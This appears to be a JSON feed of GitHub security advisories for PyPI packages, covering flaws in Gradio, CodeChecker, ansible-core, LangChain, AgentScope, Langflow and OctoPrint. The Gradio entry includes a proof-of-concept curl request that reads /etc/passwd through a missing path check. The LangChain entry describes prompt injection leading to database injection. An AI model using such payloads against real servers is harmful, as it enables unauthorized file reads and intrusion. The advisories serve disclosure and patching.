{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If File or UploadButton components are used as a part of Gradio application to preview file content, an attacker with access to the application might abuse these components to read arbitrary files from the application server.</p>\n<h3 id=\"details\">Details</h3>\n<p>Consider the following application where a user can upload a file and preview its content:</p>\n<pre><code>import gradio as gr\n\ndef greet(value: bytes):\n    return str(value)\n\ndemo = gr.Interface(fn=greet, inputs=gr.File(type=\"binary\"), outputs=\"textbox\")\n\nif __name__ == \"__main__\":\n    demo.launch()\n</code></pre>\n<p>If we run this application and make the following request (which attempts to read the <code>/etc/passwd</code> file)</p>\n<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{\"data\":[{\"path\":\"/etc/passwd\",\"orig_name\":\"test.txt\",\"size\":4,\"mime_type\":\"text/plain\",\"meta\":{\"_type\":\"gradio.FileData\"}}],\"event_data\":null,\"fn_index\":0,\"trigger_id\":8,\"session_hash\":\"mnv42s5gt7\"}'\n</code></pre>\n<p>Then this results in the following error on the server</p>\n<pre><code>gradio.exceptions.InvalidPathError: Cannot move /etc/passwd to the gradio cache dir because it was not uploaded by a user.\n</code></pre>\n<p>This is expected. However, if we now remove the <code>\"meta\":{\"_type\":\"gradio.FileData\"}</code> from the request:</p>\n<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{\"data\":[{\"path\":\"/etc/passwd\",\"orig_name\":\"test.txt\",\"size\":4,\"mime_type\":\"text/plain\"}],\"event_data\":null,\"fn_index\":0,\"trigger_id\":8,\"session_hash\":\"mnv42s5gt7\"}'\n</code></pre>\n<p>This doesn't cause an error and results in the content of /etc/passwd being shown in the response!</p>\n<p>This works because Gradio relies on the <code>processing_utils.async_move_files_to_cache</code> to sanitize all incoming file paths in all inputs. This function performs the following operation</p>\n<pre><code>    return await client_utils.async_traverse(\n        data, _move_to_cache, client_utils.is_file_obj_with_meta\n    )\n</code></pre>\n<p>where <code>client_utils.is_file_obj_with_meta</code> is used as a filter which tells on which inputs to perform the <code>_move_to_cache</code> function (which also performs the allowed/disallowed check on the file path). The problem is that <code>client_utils.is_file_obj_with_meta</code> is not guaranteed to trigger for every input that contains a file path:</p>\n<pre><code>def is_file_obj_with_meta(d) -&gt; bool:\n    \"\"\"\n    Check if the given value is a valid FileData object dictionary in newer versions of Gradio\n    where the file objects include a specific \"meta\" key, e.g.\n    {\n        \"path\": \"path/to/file\",\n        \"meta\": {\"_type: \"gradio.FileData\"}\n    }\n    \"\"\"\n    return (\n        isinstance(d, dict)\n        and \"path\" in d\n        and isinstance(d[\"path\"], str)\n        and \"meta\" in d\n        and d[\"meta\"].get(\"_type\", \"\") == \"gradio.FileData\"\n    )\n</code></pre>\n<p>For example, as in the PoC, the file path won't be checked if the <code>meta</code> key is not present in the request or if <code>_type</code> is not <code>gradio.FileData</code>.</p>\n<p>Then, the path remains under control of the attacker and is used to read a file in <code>_process_single_file</code> function in <code>file.py</code> and <code>upload_button.py</code> (and possibly other places)</p>\n<h3 id=\"poc\">PoC</h3>\n<p>As described above, run the following Gradio app</p>\n<pre><code>import gradio as gr\n\ndef greet(value: bytes):\n    return str(value)\n\ndemo = gr.Interface(fn=greet, inputs=gr.File(type=\"binary\"), outputs=\"textbox\")\n\nif __name__ == \"__main__\":\n    demo.launch()\n</code></pre>\n<p>And make the following request</p>\n<pre><code>curl 'http://127.0.0.1:7860/gradio_api/run/predict' -H 'content-type: application/json' --data-raw '{\"data\":[{\"path\":\"/etc/passwd\",\"orig_name\":\"test.txt\",\"size\":4,\"mime_type\":\"text/plain\"}],\"event_data\":null,\"fn_index\":0,\"trigger_id\":8,\"session_hash\":\"mnv42s5gt7\"}'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary file read in specific Gradio applications that use File or UploadButton components to upload files and echo/preview the content to the user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248\">https://github.com/gradio-app/gradio/security/advisories/GHSA-rhm9-gp5p-5248</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rhm9-gp5p-5248\">https://github.com/advisories/GHSA-rhm9-gp5p-5248</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rhm9-gp5p-5248",
            "title": "[gradio] Gradio vulnerable to arbitrary file read with File and UploadButton components",
            "date_modified": "2024-11-06T19:50:55.000Z",
            "date_published": "2024-11-06T16:29:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rhm9-gp5p-5248"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Authentication method confusion allows logging in as the built-in root user from an external service. The built-in root user is generated in a weak manner, cannot be disabled, and has universal access. </p>\n<h3 id=\"details\">Details</h3>\n<p>Until CodeChecker version 6.24.1 there was an auto-generated super-user account that could not be disabled.\nThe attacker needs to know only the username of the root user.</p>\n<p>This root user is unconditionally assigned superuser permissions.</p>\n<p>Which means that if any user via any service logs in with the root user's username, they will unconditionally have superuser permissions on the CodeChecker instance.</p>\n<p>The name of the user name can be found in <code>root.user</code> file in the CodeChecker configuration directory.\nYou can check if you are impacted by checking the existence of this user in the external authentication services (e.g. LDAP, PAM etc.).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker who can create an account on an enabled external authentication service, to log in as the root user, and access and control everything that can be controlled via the web interface.\nThe attacker needs to acquire the username of the root user to be successful.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Ericsson/codechecker/security/advisories/GHSA-fpm5-2wcj-vfr7\">https://github.com/Ericsson/codechecker/security/advisories/GHSA-fpm5-2wcj-vfr7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10082\">https://nvd.nist.gov/vuln/detail/CVE-2024-10082</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/commit/866f3796d01f3158c49b87ccae3e09c0807c1c7b\">https://github.com/Ericsson/codechecker/commit/866f3796d01f3158c49b87ccae3e09c0807c1c7b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpm5-2wcj-vfr7\">https://github.com/advisories/GHSA-fpm5-2wcj-vfr7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpm5-2wcj-vfr7",
            "title": "[codechecker] codechecker authentication method confusion vulnerability allows logging in as the built-in root user from an external service",
            "date_modified": "2024-11-06T15:57:59.000Z",
            "date_published": "2024-11-06T15:57:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpm5-2wcj-vfr7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Authentication bypass occurs when the API URL ends with Authentication, Configuration or ServerInfo. This bypass allows superuser access to all API endpoints other than Authentication. These endpoints include the ability to add, edit, and remove products, among others.</p>\n<h3 id=\"details\">Details</h3>\n<p>All endpoints, apart from the /Authentication is affected by the vulnerability.</p>\n<p>The vulnerability allows unauthenticated users to access all API functionality.\nYou can look for the following pattern in the logs to check if the vulnerabilty was exploited:\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/6ba02231-a3d8-4832-aee6-f96462b7441e\"></p>\n<p>Note that the url starts with v and contains a valid CodeChecker endpoint, but it ends in <code>Authentication</code>, <code>Configuration</code> or <code>ServerInfo</code> and it was made by an <code>Anonymous</code> user.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This authentication bypass allows querying, adding, changing, and deleting Products contained on the CodeChecker server, without authentication, by an anonymous user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Ericsson/codechecker/security/advisories/GHSA-f3f8-vx3w-hp5q\">https://github.com/Ericsson/codechecker/security/advisories/GHSA-f3f8-vx3w-hp5q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-10081\">https://nvd.nist.gov/vuln/detail/CVE-2024-10081</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/commit/ad41702e3108e4b92ae5d0143a5b961cc34195eb\">https://github.com/Ericsson/codechecker/commit/ad41702e3108e4b92ae5d0143a5b961cc34195eb</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f3f8-vx3w-hp5q\">https://github.com/advisories/GHSA-f3f8-vx3w-hp5q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f3f8-vx3w-hp5q",
            "title": "[codechecker] codechecker vulnerable to authentication bypass when using specifically crafted URLs",
            "date_modified": "2024-11-06T15:57:09.000Z",
            "date_published": "2024-11-06T15:57:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f3f8-vx3w-hp5q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible. The ansible-core <code>user</code> module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the <code>user</code> module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9902\">https://nvd.nist.gov/vuln/detail/CVE-2024-9902</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9902\">https://access.redhat.com/security/cve/CVE-2024-9902</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318271\">https://bugzilla.redhat.com/show_bug.cgi?id=2318271</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be\">https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65\">https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892\">https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd\">https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92\">https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32p4-gm2c-wmch\">https://github.com/advisories/GHSA-32p4-gm2c-wmch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch",
            "title": "[ansible-core] ansible-core Incorrect Authorization vulnerability",
            "date_modified": "2024-11-06T15:37:20.000Z",
            "date_published": "2024-11-06T12:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible. The ansible-core <code>user</code> module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the <code>user</code> module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9902\">https://nvd.nist.gov/vuln/detail/CVE-2024-9902</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9902\">https://access.redhat.com/security/cve/CVE-2024-9902</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318271\">https://bugzilla.redhat.com/show_bug.cgi?id=2318271</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be\">https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65\">https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892\">https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd\">https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92\">https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32p4-gm2c-wmch\">https://github.com/advisories/GHSA-32p4-gm2c-wmch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch",
            "title": "[ansible-core] ansible-core Incorrect Authorization vulnerability",
            "date_modified": "2024-11-06T15:37:20.000Z",
            "date_published": "2024-11-06T12:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible. The ansible-core <code>user</code> module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the <code>user</code> module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9902\">https://nvd.nist.gov/vuln/detail/CVE-2024-9902</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9902\">https://access.redhat.com/security/cve/CVE-2024-9902</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318271\">https://bugzilla.redhat.com/show_bug.cgi?id=2318271</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be\">https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65\">https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892\">https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd\">https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92\">https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32p4-gm2c-wmch\">https://github.com/advisories/GHSA-32p4-gm2c-wmch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch",
            "title": "[ansible-core] ansible-core Incorrect Authorization vulnerability",
            "date_modified": "2024-11-06T15:37:20.000Z",
            "date_published": "2024-11-06T12:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible. The ansible-core <code>user</code> module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the <code>user</code> module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9902\">https://nvd.nist.gov/vuln/detail/CVE-2024-9902</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9902\">https://access.redhat.com/security/cve/CVE-2024-9902</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318271\">https://bugzilla.redhat.com/show_bug.cgi?id=2318271</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be\">https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65\">https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892\">https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd\">https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92\">https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32p4-gm2c-wmch\">https://github.com/advisories/GHSA-32p4-gm2c-wmch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch",
            "title": "[ansible-core] ansible-core Incorrect Authorization vulnerability",
            "date_modified": "2024-11-06T15:37:20.000Z",
            "date_published": "2024-11-06T12:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Ansible. The ansible-core <code>user</code> module can allow an unprivileged user to silently create or replace the contents of any file on any system path and take ownership of it when a privileged user executes the <code>user</code> module against the unprivileged user's home directory. If the unprivileged user has traversal permissions on the directory containing the exploited target file, they retain full control over the contents of the file as its owner.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9902\">https://nvd.nist.gov/vuln/detail/CVE-2024-9902</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2024-9902\">https://access.redhat.com/security/cve/CVE-2024-9902</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2318271\">https://bugzilla.redhat.com/show_bug.cgi?id=2318271</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be\">https://github.com/ansible/ansible/commit/03794735d370db98a5ec2ad514fab2b0dd22d6be</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65\">https://github.com/ansible/ansible/commit/03daf774d0d80fb7235910ed1c2b4fbcaebdfe65</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892\">https://github.com/ansible/ansible/commit/3b6de811abea0a811e03e3029222a7e459922892</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd\">https://github.com/ansible/ansible/commit/9d7312f695639e804d2caeb1d0f51c716a9ac7dd</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92\">https://github.com/ansible/ansible/commit/f7be90626da3035c697623dcf9c90b7a0bc91c92</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-32p4-gm2c-wmch\">https://github.com/advisories/GHSA-32p4-gm2c-wmch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch",
            "title": "[ansible-core] ansible-core Incorrect Authorization vulnerability",
            "date_modified": "2024-11-06T15:37:20.000Z",
            "date_published": "2024-11-06T12:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-32p4-gm2c-wmch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8309\">https://nvd.nist.gov/vuln/detail/CVE-2024-8309</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255\">https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255</a></li>\n<li><a href=\"https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5\">https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-115.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-115.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45pg-36p6-83v9\">https://github.com/advisories/GHSA-45pg-36p6-83v9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45pg-36p6-83v9",
            "title": "[langchain] Langchain SQL Injection vulnerability",
            "date_modified": "2024-11-05T16:58:28.000Z",
            "date_published": "2024-10-29T15:32:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45pg-36p6-83v9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-8309\">https://nvd.nist.gov/vuln/detail/CVE-2024-8309</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255\">https://github.com/langchain-ai/langchain/commit/c2a3021bb0c5f54649d380b42a0684ca5778c255</a></li>\n<li><a href=\"https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5\">https://huntr.com/bounties/8f4ad910-7fdc-4089-8f0a-b5df5f32e7c5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-115.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-115.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45pg-36p6-83v9\">https://github.com/advisories/GHSA-45pg-36p6-83v9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45pg-36p6-83v9",
            "title": "[langchain-community] Langchain SQL Injection vulnerability",
            "date_modified": "2024-11-05T16:58:28.000Z",
            "date_published": "2024-10-29T15:32:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45pg-36p6-83v9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In agentscope &lt;=v0.0.4, the file <code>agentscope\\web\\workstation\\workflow_utils.py</code> has the function <code>is_callable_expression</code>. Within this function, the line <code>result = eval(s)</code> poses a security risk as it can directly execute user-provided commands.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48050\">https://nvd.nist.gov/vuln/detail/CVE-2024-48050</a></li>\n<li><a href=\"https://gist.github.com/AfterSnows/0ad9d233a9d2a5b7e6e5273e2e23508d\">https://gist.github.com/AfterSnows/0ad9d233a9d2a5b7e6e5273e2e23508d</a></li>\n<li><a href=\"https://rumbling-slice-eb0.notion.site/Unauthenticated-Remote-Code-Execution-via-The-use-of-eval-in-is_callable_expression-and-sanitize_nod-cd4ea6c576da4e0b965ef596855c298d\">https://rumbling-slice-eb0.notion.site/Unauthenticated-Remote-Code-Execution-via-The-use-of-eval-in-is_callable_expression-and-sanitize_nod-cd4ea6c576da4e0b965ef596855c298d</a></li>\n<li><a href=\"https://github.com/modelscope/agentscope/blob/main/src/agentscope/web/workstation/workflow_utils.py#L11\">https://github.com/modelscope/agentscope/blob/main/src/agentscope/web/workstation/workflow_utils.py#L11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6p55-qr3j-mpgq\">https://github.com/advisories/GHSA-6p55-qr3j-mpgq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6p55-qr3j-mpgq",
            "title": "[agentscope] AgentScope uses `eval`",
            "date_modified": "2024-11-05T16:10:12.000Z",
            "date_published": "2024-11-05T00:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6p55-qr3j-mpgq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>langflow &lt;=1.0.18 is vulnerable to Remote Code Execution (RCE) as any component provided the code functionality and the components run on the local machine rather than in a sandbox.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-48061\">https://nvd.nist.gov/vuln/detail/CVE-2024-48061</a></li>\n<li><a href=\"https://gist.github.com/AfterSnows/1e58257867002462923fd62dde2b5d61\">https://gist.github.com/AfterSnows/1e58257867002462923fd62dde2b5d61</a></li>\n<li><a href=\"https://rumbling-slice-eb0.notion.site/There-is-a-Remote-Code-Execution-RCE-vulnerability-in-the-repository-https-github-com-langflow-a-105e3cda9e8c800fac92f1b571bd40d8\">https://rumbling-slice-eb0.notion.site/There-is-a-Remote-Code-Execution-RCE-vulnerability-in-the-repository-https-github-com-langflow-a-105e3cda9e8c800fac92f1b571bd40d8</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/issues/696\">https://github.com/langflow-ai/langflow/issues/696</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5p5r-57fx-pmfr\">https://github.com/advisories/GHSA-5p5r-57fx-pmfr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5p5r-57fx-pmfr",
            "title": "[langflow] Langflow vulnerable to remote code execution",
            "date_modified": "2024-11-05T16:07:07.000Z",
            "date_published": "2024-11-05T00:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5p5r-57fx-pmfr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OctoPrint versions up until and including 1.10.2 contain a vulnerability that allows an attacker that has gained temporary control over an authenticated victim's OctoPrint browser session to retrieve/recreate/delete the user's or - if the victim has admin permissions - the global API key without having to reauthenticate by re-entering the user account's password. </p>\n<p>An attacker could use a stolen API key to access OctoPrint through its API, or disrupt workflows depending on the API key they deleted.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability will be patched in version 1.10.3.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Jacopo Tediosi.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-cc6x-8cc7-9953\">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-cc6x-8cc7-9953</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/commit/9bc80d782d72881b16e20873dcd0b8314324c70c\">https://github.com/OctoPrint/OctoPrint/commit/9bc80d782d72881b16e20873dcd0b8314324c70c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51493\">https://nvd.nist.gov/vuln/detail/CVE-2024-51493</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cc6x-8cc7-9953\">https://github.com/advisories/GHSA-cc6x-8cc7-9953</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cc6x-8cc7-9953",
            "title": "[OctoPrint] OctoPrint has API key access in settings without reauthentication",
            "date_modified": "2024-11-05T21:36:44.000Z",
            "date_published": "2024-11-05T15:08:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cc6x-8cc7-9953"
            },
            "tags": [
                "severity"
            ]
        },
        {
